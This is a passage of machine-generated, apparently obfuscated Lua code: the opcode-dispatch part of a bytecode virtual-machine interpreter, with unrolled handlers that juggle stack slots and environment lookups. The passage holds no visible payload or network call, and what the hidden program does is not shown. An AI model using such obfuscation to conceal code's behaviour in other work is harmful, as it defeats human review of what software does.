                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = {};
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                end
              elseif (Enum <= 222) then
                if (Enum > 221) then
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum == 223) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 236) then
              if (Enum <= 230) then
                if (Enum <= 227) then
                  if (Enum <= 225) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum == 226) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local Edx;
                    local Results, Limit;
                    local A;
                    local K;
                    local B;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    B = Inst[3];
                    K = Stk[B];
                    for Idx = B + 1, Inst[4] do
                      K = K .. Stk[Idx];
                    end
                    Stk[Inst[2]] = K;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 228) then
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Env[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Env[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                elseif (Enum > 229) then
                  Stk[Inst[2]] = Stk[Inst[3]] * Stk[Inst[4]];
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 233) then
                if (Enum <= 231) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 232) then
                  local Results;
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Stk[A + 1]));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                  Edx = 0;
                  for Idx = A, Inst[4] do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 234) then
                local A;
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              elseif (Enum > 235) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 242) then
              if (Enum <= 239) then
                if (Enum <= 237) then
                  local B = Inst[3];
                  local K = Stk[B];
                  for Idx = B + 1, Inst[4] do
                    K = K .. Stk[Idx];
                  end
                  Stk[Inst[2]] = K;
                elseif (Enum == 238) then
                  local A;
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                else
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                end
              elseif (Enum <= 240) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum == 241) then
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Upvalues[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]] * Stk[Inst[4]];
              else
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
              end
            elseif (Enum <= 245) then
              if (Enum <= 243) then
                local A;
                local K;
                local B;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                B = Inst[3];
                K = Stk[B];
                for Idx = B + 1, Inst[4] do
                  K = K .. Stk[Idx];
                end
                Stk[Inst[2]] = K;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
